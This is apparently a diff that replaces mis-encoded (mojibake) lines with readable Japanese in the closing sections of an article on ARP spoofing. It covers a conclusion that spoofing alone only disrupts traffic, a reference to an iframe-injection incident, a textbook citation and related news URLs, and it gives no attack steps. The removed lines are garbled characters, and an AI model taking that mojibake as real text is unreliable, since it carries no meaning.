-��0x07.) �Q�l����
+■0x06.) 最後に
 
-[1]�u�ډ�TCP/IP�qVol.1�r�v���g�R���v�s�A�\���G�f���P�[�V����
+　ARPスプーフィングは、それ自体では通信妨害を引き起こすのみです。汚染され
+たARPキャッシュを参照して送信先を決定したフレームは、正しい送信先へ向かわ
+ないためです。ARPスプーフィングは、あくまでも本格的な攻撃のための第一歩に
+過ぎません。さくらインターネットではwebサーバーからの応答パケットが改ざん
+（iframeタグの挿入）されました。このような攻撃を成立させるためには、ARPス
+プーフィングやパケットの改ざん以外にも手順が必要となります。それらはARPス
+プーフィングとはまた別のテクニックが必要となり、攻撃内容によっては難易度
+が上がります。
+　詳細な攻撃手順やテクニックについての解説は、また別の機会にとっておくこ
+とにします。
 
 
-��0x08.)  �֘AURL
+■0x07.) 参考文献
 
-[1]ARP�𗘗p�������[�J���G���A�l�b�g���[�N�ɂ�����s���ڑ��̔r��
+[1]「詳解TCP/IP〈Vol.1〉プロトコル」ピアソンエデュケーション
+
+
+■0x08.)  関連URL
+
+[1]ARPを利用したローカルエリアネットワークにおける不正接続の排除
     http://www.sfc.wide.ad.jp/rg/2004s/term/material/11/2004S_TermProject_macchan_07-29.pdf
-[2]ARP�X�v�[�t�B���O�ŒʐM�T��I | The Weekly Herald
+[2]ARPスプーフィングで通信傍受！ | The Weekly Herald
     http://herald.jugem.jp/?eid=67
-[3][ethna-users:0969] ML�ۊǌɂ̃y�[�W�ɕς�iframe�����ߍ��܂�Ă��錏��
-����
+[3][ethna-users:0969] ML保管庫のページに変なiframeが埋め込まれている件に
+ついて
     http://ml.ethna.jp/pipermail/users/2008-June/000968.html
-[4]�f�[�^�Z���^����ARP spoofing�U���ŒʐM�����񂪔����A�΍�̒�΂�? - �X
-���b�V���h�b�g�E�W���p��
+[4]データセンタ内のARP spoofing攻撃で通信改ざんが発生、対策の定石は? - ス
+ラッシュドット・ジャパン
     http://slashdot.jp/security/article.pl?sid=08/06/05/008238
-[5]�mARP�X�v�[�t�B���O�n���̃}�V�����Ă̒ʐM��������C�Ď��������挈 -
- �����㐫�ɗh�炮�C���^�[�l�b�g�FITpro
+[5]［ARPスプーフィング］他のマシンあての通信を乗っ取り，監視強化が先決 -
+ ぜい弱性に揺らぐインターネット：ITpro
     http://itpro.nikkeibp.co.jp/article/COLUMN/20090225/325452/
 
 
